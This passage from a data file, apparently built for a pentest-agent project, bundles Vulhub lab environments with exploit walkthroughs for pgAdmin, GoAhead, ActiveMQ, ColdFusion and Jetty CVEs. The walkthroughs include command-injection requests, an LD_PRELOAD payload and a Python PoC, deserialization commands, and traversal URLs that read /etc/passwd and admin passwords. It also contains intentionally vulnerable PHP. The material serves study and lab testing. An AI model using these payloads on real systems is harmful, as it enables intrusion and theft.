the execution of the malicious code:\n\n![2](2.png)\n"
  },
  {
    "filename": "CVE-2022-4223.md",
    "filenamenomd": "CVE-2022-4223",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/pgadmin/CVE-2022-4223/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/pgadmin/CVE-2022-4223/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 87 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/pgadmin:6.16\n   ports:\n    - \"5050:5050\"\n\n```\n\n",
    "readme": "# pgAdmin <= 6.16 Unauthenticated Remote Command Execution (CVE-2022-4223)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\npgAdmin is a popular and feature rich Open Source administration and development platform for PostgreSQL, the most advanced Open Source database in the world.\n\nThe pgAdmin server includes an HTTP API that is intended to be used to validate the path a user selects to external PostgreSQL utilities such as pg_dump and pg_restore. The utility is executed by the server to determine what PostgreSQL version it is from. Versions of pgAdmin prior to 6.17 failed to properly secure this API, which could allow an unauthenticated user to execute arbitrary commands on the server.\n\nReferences:\n\n- <https://github.com/pgadmin-org/pgadmin4/commit/799b6d8f7c10e920c9e67c2c18d381d6320ca604>\n- <https://github.com/pgadmin-org/pgadmin4/commit/461849c2763e680ed2296bb8a753ca7aef546595>\n- <https://github.com/advisories/GHSA-3v6v-2x6p-32mc>\n\n## Vulnerable Environment\n\nExecute following command to start a pgAdmin 6.16 server:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, browse the `http://your-ip:5050` to see the default login page of pgAdmin.\n\n## Exploit\n\nBefore exploiting the vulnerability, send the following request to obtain the CSRF token:\n\n```\nGET /login HTTP/1.1\nHost: your-ip:5050\nAccept: application/json, text/plain, */*\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7\nConnection: close\n\n\n```\n\nGet the session id and csrf token from response:\n\n![](1.png)\n\nThen, fill the following request with the session id and csrf token and send it:\n\n```\nPOST /misc/validate_binary_path HTTP/1.1\nHost: your-ip:5050\nContent-Length: 27\nX-pgA-CSRFToken: [csrf-token]\nAccept: application/json, text/plain, */*\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36\nContent-Type: application/json\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7\nCookie: pga4_session=[session-id]\nConnection: close\n\n{\"utility_path\":\"a\\\";id;#\"}\n```\n\nAs you can see, `id` command has been executed successful:\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2017-17562.md",
    "filenamenomd": "CVE-2017-17562",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/goahead/CVE-2017-17562/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/goahead/CVE-2017-17562/index\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/goahead/CVE-2017-17562/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 142 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/goahead:3.6.4\n   ports:\n    - \"8080:80\"\n   volumes:\n    - ./index:/var/www/goahead/cgi-bin/index\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/goahead/CVE-2017-17562/index\n\n- Extension: \n- Language: unknown\n- Size: 108 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\n#!/usr/bin/perl\n\nprint \"Content-Type: text/html\\n\\n\";\nprint \"<title>cgi title</title><h1>hello world!</h1>\";\n```\n\n",
    "readme": "# GoAhead Web Server Environment Variables Injection and `LD_PRELOAD` Remote Code Execution (CVE-2017-17562)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nEmbedthis GoAhead is the world's most popular, tiny embedded web server, which is deployed in hundreds of millions of devices and is ideal for the smallest of embedded devices.\n\nGoAhead before 3.6.5 allows remote code execution if CGI is enabled and a CGI program is dynamically linked. This is a result of initializing the environment of forked CGI scripts using untrusted HTTP request parameters in the cgiHandler function in `cgi.c`. When combined with the glibc dynamic linker, this behaviour can be abused for remote code execution using special parameter names such as `LD_PRELOAD`. An attacker can POST their shared object payload in the body of the request, and reference it using /proc/self/fd/0.\n\nReferences:\n\n - https://www.elttam.com.au/blog/goahead/\n - https://www.exploit-db.com/exploits/43360\n - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/goahead_ldpreload.rb\n\n## Vulnerable environment\n\nExecute following commands to start a GoAhead 3.6.4:\n\n```\ndocker compose up -d\n```\n\nThen, you can see the welcome page at `http://your-ip:8080`, CGI scripts is available at `http://your-ip:8080/cgi-bin/index`.\n\n## Exploit\n\nFirst of all, compile this hijack code to a dynamic shared library:\n\n```C\n#include <unistd.h>\n\nstatic void before_main(void) __attribute__((constructor));\n\nstatic void before_main(void)\n{\n    write(1, \"Hello: World!\\n\", 14);\n}\n```\n\n> Please notice that, since GoAhead is a compact embedded webserver running on almost any possible IoT device, the format of dynamic shared library is always depending on the target server architecture. In the real world, compiling exploits is not as easy as this manual suggests, although Vulhub could show you a simplest example.\n\nCompile on a x86/64 environment:\n\n```\ngcc -shared -fPIC ./payload.c -o payload.so\n```\n\nUse curl to trigger the attack:\n\n```\ncurl -X POST --data-binary @payload.so \"http://your-ip:8080/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0\" -i \n```\n\nThe response header `Hello: world!` is printed to indicate that the code has been executed:\n\n![](1.png)\n\nA reverse shell is got:\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2015-5254.md",
    "filenamenomd": "CVE-2015-5254",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/activemq/CVE-2015-5254/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/activemq/CVE-2015-5254/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 114 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n activemq:\n   image: vulhub/activemq:5.11.1\n   ports:\n    - \"61616:61616\"\n    - \"8161:8161\"\n```\n\n",
    "readme": "# ActiveMQ Deserialization Vulnerability (CVE-2015-5254)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache ActiveMQ is an open source messaging middleware developed by the American Pachitea (Apache) Software Foundation that supports Java messaging services, clustering, Spring framework, and more.\n\nApache ActiveMQ version 5.x before the 5.13.0 security vulnerability, the vulnerability caused by the program does not limit the classes that can be serialized in the proxy. Remote attacker can make a special serialized Java Message Service (JMS) ObjectMessage objects exploit this vulnerability to execute arbitrary code.\n\nReference Links:\n\n- https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf\n\n## Vulnerability environment\n\nStart the vulnerable environment:\n\n```\ndocker compose up -d\n```\n\nAfter running the environment, it will establish two ports on port 61616 and 8161. Port 61616 is the working port, and messages are delivered on this port. Port 8161 is the webpage management page port. Access `http://your-ip:8161`, You can see the network management page, but this vulnerability does not require a network theoretically.\n\n## Exploit\n\nThe exploit process is as follows:\n\n1. Generate serialized payload (u can using ysoserial)\n2. send payload to port 61616\n3. Access the web management page and read the serialization messages, then u can trigger vulnerability.\n\nTo exploit this environment we will use [jmet](https://github.com/matthiaskaiser/jmet) (Java Message Exploitation Tool). First download the jar file of jmet, and create folder called **external** in the same directory (otherwise it may occur the error that the folder does not exist).\n\nthe jmet is to use ysoserial to generate Payload and send it (the jar comes with ysoserial, we don't no need to download it again), so we need to choose one that can be used in ysoserial as the gadget, such as ROME.\n\nExecute:\n\n```\njava -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y \"touch /tmp/success\" -Yp ROME your-ip 61616\n```\n\n![](1.png)\n\nAt this point, a queue named event will be added to the target ActiveMQ.\n\nYou can visit `http://your-ip:8161/admin/browse.jsp?JMSDestination=Event` to see all messages in this queue.\n\n(**login / password:** admin/admin):\n\n![](2.png)\n\nClick this message to trigger the command execute, this time into the container `docker compose exec activemq bash`,\n\nwe can see /tmp/success has been successfully created, indicating exploit successful:\n\n![](3.png)\n\nReplace the command with a reverse shell statement and reuse it:\n\n![](4.png)\n\nIt's worth noting that accessing messages through the web administration page and triggering the vulnerability requires administrator privileges. In the absence of password, we can induce administrator visit our link to trigger, or disguised as legitimate messages from other services need to wait for client access when triggered.\n"
  },
  {
    "filename": "CVE-2010-2861.md",
    "filenamenomd": "CVE-2010-2861",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/coldfusion/CVE-2010-2861/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/coldfusion/CVE-2010-2861/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 103 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n  coldfusion:\n    image: vulhub/coldfusion:8.0.1\n    ports:\n      - \"8500:8500\"\n\n```\n\n",
    "readme": "# Adobe ColdFusion Directory Traversal Vulnerability (CVE-2010-2861)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nAdobe ColdFusion is a commercial rapid web-application development computing platform created by J. J. Allaire in 1995.\n\nThere is a directory traversal vulnerability in the Adobe ColdFusion 9.0.1 and earlier, which allow remote attackers to read arbitrary files via the locale parameter to (1) CFIDE/administrator/settings/mappings.cfm, (2) logging/settings.cfm, (3) datasources/index.cfm, (4) j2eepackaging/editarchive.cfm, and (5) enter.cfm in CFIDE/administrator/.\n\n## Environment setup\n\nExecute the following command to start Adobe CouldFusion 8.0.1 server:\n\n```\ndocker compose up -d\n```\n\nThe server startup may take 1~5 minutes. After that, visit `http://your-ip:8500/CFIDE/administrator/enter.cfm` to see the initialization page, enter the password `admin` to initialize the entire server.\n\n## POC\n\nRead the file `/etc/passwd` via `http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en`:\n\n![](1.png)\n\nRead the background administrator password via `http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/ password.properties%00en`:\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2021-42342.md",
    "filenamenomd": "CVE-2021-42342",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/goahead/CVE-2021-42342/poc.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/goahead/CVE-2021-42342/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/goahead/CVE-2021-42342/index\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/goahead/CVE-2021-42342/poc.py\n\n- Extension: .py\n- Language: python\n- Size: 1961 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\nimport sys\nimport socket\nimport ssl\nimport random\nfrom urllib.parse import urlparse, ParseResult\n\nPAYLOAD_MAX_LENGTH = 16384 - 200\n\n\ndef exploit(client, parts: ParseResult, payload: bytes):\n    path = '/' if not parts.path else parts.path\n    boundary = '----%s' % str(random.randint(1000000000000, 9999999999999))\n    padding = 'a' * 2000\n    content_length = min(len(payload) + 500, PAYLOAD_MAX_LENGTH)\n    data = fr'''POST {path} HTTP/1.1\nHost: {parts.hostname}\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\nConnection: close\nContent-Type: multipart/form-data; boundary={boundary}\nContent-Length: {content_length}\n\n--{boundary}\nContent-Disposition: form-data; name=\"LD_PRELOAD\";\n\n/proc/self/fd/7\n--{boundary}\nContent-Disposition: form-data; name=\"data\"; filename=\"1.txt\"\nContent-Type: text/plain\n\n#payload#{padding}\n--{boundary}--\n'''.replace('\\n', '\\r\\n')\n    data = data.encode().replace(b'#payload#', payload)\n    client.send(data)\n    resp = client.recv(20480)\n    print(resp.decode())\n\n\ndef main():\n    target = sys.argv[1]\n    payload_filename = sys.argv[2]\n\n    with open(payload_filename, 'rb') as f:\n        data = f.read()\n\n    if len(data) > PAYLOAD_MAX_LENGTH:\n        raise Exception('payload size must not larger than %d', PAYLOAD_MAX_LENGTH)\n\n    parts = urlparse(target)\n    port = parts.port\n    if not parts.port:\n        if parts.scheme == 'https':\n            port = 443\n        else:\n            port = 80\n\n    context = ssl.create_default_context()\n    with socket.create_connection((parts.hostname, port), timeout=8) as client:\n        if parts.scheme == 'https':\n            with context.wrap_socket(client, server_hostname=parts.hostname) as ssock:\n                exploit(ssock, parts, data)\n\n        else:\n            exploit(client, parts, data)\n\n\nif __name__ == '__main__':\n    main()\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/goahead/CVE-2021-42342/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 143 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/goahead:5.1.4\n   ports:\n    - \"8080:80\"\n   volumes:\n    - ./index:/var/www/goahead/cgi-bin/index\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/goahead/CVE-2021-42342/index\n\n- Extension: \n- Language: unknown\n- Size: 100 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\n#!/bin/bash\n\necho -ne \"Content-Type: text/html\\n\\n\";\necho \"<title>example</title><h1>Example</h1>\";\n\n```\n\n",
    "readme": "# GoAhead Web Server Environment Variables Injection and `LD_PRELOAD` Remote Code Execution (CVE-2021-42342)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nAn issue was discovered in GoAhead 4.x and 5.x before 5.1.5. In the file upload filter, user form variables can be passed to CGI scripts without being prefixed with the CGI prefix. This permits tunneling untrusted environment variables into vulnerable CGI scripts.\n\nAttacker can use this feature to upload their shared object payload in the multipart form and hijack the `LD_PRELOAD` environment variable to execute arbitrary code.\n\nThis vulnerability is the patch bypass of the [CVE-2017-17562](https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2017-17562).\n\nReferences:\n\n- https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2017-17562\n- https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/\n- https://mp.weixin.qq.com/s/AS9DHeHtgqrgjTb2gzLJZg\n\n## Vulnerable environment\n\nExecute following commands to start a GoAhead 5.1.4:\n\n```\ndocker compose up -d\n```\n\nThen, you can see the welcome page at `http://your-ip:8080`, CGI scripts is available at `http://your-ip:8080/cgi-bin/index`.\n\n## Exploit\n\nFirst of all, compile this hijack code to a dynamic shared library:\n\n```C\n#include <unistd.h>\n\nstatic void before_main(void) __attribute__((constructor));\n\nstatic void before_main(void)\n{\n    write(1, \"Hello: World\\r\\n\\r\\n\", 16);\n    write(1, \"Hacked\\n\", 7);\n}\n```\n\n> Please notice that, since GoAhead is a compact embedded webserver running on almost any possible IoT device, the format of dynamic shared library is always depending on the target server architecture. In the real world, compiling exploits is not as easy as this manual suggests, although Vulhub could show you a simplest example.\n\nCompile on a x86/64 environment:\n\n```\ngcc -s -shared -fPIC ./payload.c -o payload.so\n```\n\nThen, we are using [this script](poc.py) to reproduce the vulnerability.\n\n```\npython poc.py http://target-ip:8080/cgi-bin/index /path/to/payload.so\n```\n\nHijack is successful:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2021-28164.md",
    "filenamenomd": "CVE-2021-28164",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/jetty/CVE-2021-28164/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/jetty/CVE-2021-28164/src/index.jsp\n- /home/yay/pentest-agent/vulhub/sites_no_md/jetty/CVE-2021-28164/src/WEB-INF/web.xml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/jetty/CVE-2021-28164/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 146 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2.2'\nservices:\n  web:\n    image: vulhub/jetty:9.4.37\n    ports:\n      - \"8080:8080\"\n    volumes: \n      - ./src:/opt/jetty/webapps/ROOT\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/jetty/CVE-2021-28164/src/index.jsp\n\n- Extension: .jsp\n- Language: unknown\n- Size: 1375 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\n\n<!doctype html>\n<html>\n<head>\n    <title>Example Domain</title>\n\n    <meta charset=\"utf-8\" />\n    <meta http-equiv=\"Content-type\" content=\"text/html; charset=utf-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n    <style type=\"text/css\">\n        body {\n            background-color: #f0f0f2;\n            margin: 0;\n            padding: 0;\n            font-family: -apple-system, system-ui, BlinkMacSystemFont, \"Segoe UI\", \"Open Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif;\n            \n        }\n        div {\n            width: 600px;\n            margin: 5em auto;\n            padding: 2em;\n            background-color: #fdfdff;\n            border-radius: 0.5em;\n            box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);\n        }\n        a:link, a:visited {\n            color: #38488f;\n            text-decoration: none;\n        }\n        @media (max-width: 700px) {\n            div {\n                margin: 0 auto;\n                width: auto;\n            }\n        }\n    </style>\n</head>\n\n<body>\n<div>\n    <h1><% out.println(\"Example Domain\"); %></h1>\n    <p>This domain is for use in illustrative examples in documents. You may use this\n    domain in literature without prior coordination or asking for permission.</p>\n    <p><a href=\"https://www.iana.org/domains/example\">More information...</a></p>\n</div>\n</body>\n</html>\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/jetty/CVE-2021-28164/src/WEB-INF/web.xml\n\n- Extension: .xml\n- Language: xml\n- Size: 215 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```xml\n<!DOCTYPE web-app PUBLIC\n \"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\"\n \"http://java.sun.com/dtd/web-app_2_3.dtd\" >\n\n<web-app>\n  <display-name>Archetype Created Web Application</display-name>\n</web-app>\n\n```\n\n",
    "readme": "# Jetty Ambiguous Paths Information Disclosure Vulnerability (CVE-2021-28164)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nEclipse Jetty is a Java web server and Java Servlet container.\n\nJetty release 9.4.37 introduced a more precise implementation of RFC3986 with regards to URI decoding, together with some new compliance modes to optionally allow support of some URI that may have ambiguous interpretation within the Servlet specified API methods behaviours. The default mode allowed % encoded . characters to be excluded for URI normalisation, which is correct by the RFC, but is not assumed by common Servlet implementations.\n\nThe default compliance mode allows requests with URIs that contain `%2e` or `%2e%2e` segments to access protected resources within the WEB-INF directory. For example a request to `/context/%2e/WEB-INF/web.xml` can retrieve the web.xml file. This can reveal sensitive information regarding the implementation of a web application.\n\nThis bug is fixed on version 9.4.39.\n\nReference links.\n\n- https://github.com/eclipse/jetty.project/security/advisories/GHSA-v7ff-8wcx-gmc5\n- https://xz.aliyun.com/t/10039\n\n## Vulnerable Application\n\nExecute the following command to start a Jetty 9.4.37 server.\n\n```\ndocker compose up -d\n```\n\nAfter the server starts, visit ``http://your-ip:8080`` to see an example page.\n\n## Exploit\n\nThe sensitive file web.xml is not accessible through `/WEB-INF/web.xml`.\n\n![](1.png)\n\nUse `%2e/` to bypass the restriction:\n\n```\ncurl -v 'http://192.168.1.162:8080/%2e/WEB-INF/web.xml'\n```\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2021-28169.md",
    "filenamenomd": "CVE-2021-28169",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/jetty/CVE-2021-28169/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/jetty/CVE-2021-28169/src/index.jsp\n- /home/yay/pentest-agent/vulhub/sites_no_md/jetty/CVE-2021-28169/src/WEB-INF/web.xml\n- /home/yay/pentest-agent/vulhub/sites_no_md/jetty/CVE-2021-28169/src/css/base.css\n- /home/yay/pentest-agent/vulhub/sites_no_md/jetty/CVE-2021-28169/src/css/app.css\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/jetty/CVE-2021-28169/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 146 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2.2'\nservices:\n  web:\n    image: vulhub/jetty:9.4.40\n    ports:\n      - \"8080:8080\"\n    volumes: \n      - ./src:/opt/jetty/webapps/ROOT\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/jetty/CVE-2021-28169/src/index.jsp\n\n- Extension: .jsp\n- Language: unknown\n- Size: 661 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\n\n<!doctype html>\n<html>\n<head>\n    <title>Example Domain</title>\n\n    <meta charset=\"utf-8\" />\n    <meta http-equiv=\"Content-type\" content=\"text/html; charset=utf-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n    <link rel=\"stylesheet\" href=\"/static?/css/base.css&/css/app.css\">  \n</head>\n\n<body>\n<div>\n    <h1><% out.println(\"Example Domain\"); %></h1>\n    <p>This domain is for use in illustrative examples in documents. You may use this\n    domain in literature without prior coordination or asking for permission.</p>\n    <p><a href=\"https://www.iana.org/domains/example\">More information...</a></p>\n</div>\n</body>\n</html>\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/jetty/CVE-2021-28169/src/WEB-INF/web.xml\n\n- Extension: .xml\n- Language: xml\n- Size: 477 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```xml\n<!DOCTYPE web-app PUBLIC\n \"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\"\n \"http://java.sun.com/dtd/web-app_2_3.dtd\" >\n\n<web-app>\n  <display-name>Archetype Created Web Application</display-name>\n  <servlet>\n    <servlet-name>Concat</servlet-name>\n    <servlet-class>org.eclipse.jetty.servlets.ConcatServlet</servlet-class>\n  </servlet>\n\n  <servlet-mapping>\n    <servlet-name>Concat</servlet-name>\n    <url-pattern>/static</url-pattern>\n  </servlet-mapping>\n</web-app>\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/jetty/CVE-2021-28169/src/css/base.css\n\n- Extension: .css\n- Language: unknown\n- Size: 211 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\nbody {\n    background-color: #f0f0f2;\n    margin: 0;\n    padding: 0;\n    font-family: -apple-system, system-ui, BlinkMacSystemFont, \"Segoe UI\", \"Open Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif;\n    \n}\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/jetty/CVE-2021-28169/src/css/app.css\n\n- Extension: .css\n- Language: unknown\n- Size: 332 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\ndiv {\n    width: 600px;\n    margin: 5em auto;\n    padding: 2em;\n    background-color: #fdfdff;\n    border-radius: 0.5em;\n    box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);\n}\na:link, a:visited {\n    color: #38488f;\n    text-decoration: none;\n}\n@media (max-width: 700px) {\n    div {\n        margin: 0 auto;\n        width: auto;\n    }\n}\n```\n\n",
    "readme": "# Jetty Utility Servlets ConcatServlet Double Decoding Information Disclosure Vulnerability (CVE-2021-28169)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nEclipse Jetty is a Java web server and Java Servlet container.\n\nBefore version 9.4.40, 10.0.2, 11.0.2, the `ConcatServlet` and `WelcomeFilter` classes in Jetty Servlets are influenced by a double decoding bug. If developers use these two classes manually, attackers can use them to download arbitrary sensitive files in the WEB-INF directory.\n\nReference links.\n\n- https://github.com/eclipse/jetty.project/security/advisories/GHSA-gwcr-j4wh-j3cq\n\n## Vulnerable Application\n\nExecute the following command to start a Jetty 9.4.40 server.\n\n```\ndocker compose up -d\n```\n\nAfter the server starts, visit ``http://your-ip:8080`` to see an example page. This page uses the `ConcatServlet` to optimize the loading of static files:\n\n```\n<link rel=\"stylesheet\" href=\"/static?/css/base.css&/css/app.css\">\n```\n\n## Exploit\n\nThe sensitive file web.xml is not accessible through `/static?/WEB-INF/web.xml`.\n\n![](1.png)\n\nDouble URL encoding `W` to bypass the restriction:\n\n```\ncurl -v 'http://your-ip:8080/static?/%2557EB-INF/web.xml'\n```\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2018-19518.md",
    "filenamenomd": "CVE-2018-19518",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/php/CVE-2018-19518/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/php/CVE-2018-19518/www/index.php\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/php/CVE-2018-19518/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 115 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n web:\n   image: vulhub/php:5.6.38-apache\n   volumes:\n    - ./www:/var/www/html\n   ports:\n    - \"8080:80\"\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/php/CVE-2018-19518/www/index.php\n\n- Extension: .php\n- Language: php\n- Size: 2322 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```php\n<?php\nif(!empty($_POST)) {\n    $imap = @imap_open('{'.$_POST['hostname'].':993/imap/ssl}INBOX', $_POST['username'], $_POST['password']);\n}\n?>\n<!doctype html>\n<html lang=\"en\">\n<head>\n    <!-- Required meta tags -->\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">\n\n    <!-- Bootstrap CSS -->\n    <link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/bootstrap@4.1.3/dist/css/bootstrap.min.css\" integrity=\"sha256-eSi1q2PG6J7g7ib17yAaWMcrr5GrtohYChqibrV7PBE=\" crossorigin=\"anonymous\">\n\n    <title>Input your email server</title>\n</head>\n<body>\n\n<div class=\"container\">\n        <h2>Test your email server</h2>\n        <?php if(!empty($_POST)): ?>\n        <?php if($imap): ?>\n            <div class=\"alert alert-success\" role=\"alert\">\n                Connect successful!\n            </div>\n        <?php else: ?>\n            <div class=\"alert alert-danger\" role=\"alert\">\n                Connect failed!\n            </div>\n        <?php endif; ?>\n        <?php endif; ?>\n        <form method=\"post\">\n            <div class=\"form-group\">\n                <label>Server address</label>\n                <input type=\"text\" name=\"hostname\" class=\"form-control\" >\n            </div>\n            <div class=\"form-group\">\n                <label>Username</label>\n                <input type=\"text\" name=\"username\" class=\"form-control\" >\n            </div>\n            <div class=\"form-group\">\n                <label>Password</label>\n                <input type=\"password\" class=\"form-control\" name=\"password\">\n            </div>\n            <button type=\"submit\" class=\"btn btn-primary\">Submit</button>\n        </form>\n</div>\n\n\n<!-- Optional JavaScript -->\n<!-- jQuery first, then Popper.js, then Bootstrap JS -->\n<script src=\"https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js\" integrity=\"sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=\" crossorigin=\"anonymous\"></script>\n<script src=\"https://cdn.jsdelivr.net/npm/popper.js@1.14.4/dist/umd/popper.min.js\" integrity=\"sha256-EGs9T1xMHdvM1geM8jPpoo8EZ1V1VRsmcJz8OByENLA=\" crossorigin=\"anonymous\"></script>\n<script src=\"https://cdn.jsdelivr.net/npm/bootstrap@4.1.3/dist/js/bootstrap.min.js\" integrity=\"sha256-VsEqElsCHSGmnmHXGQzvoWjWwoznFSZc6hs7ARLRacQ=\" crossorigin=\"anonymous\"></script>\n</body>\n</html>\n```\n\n",
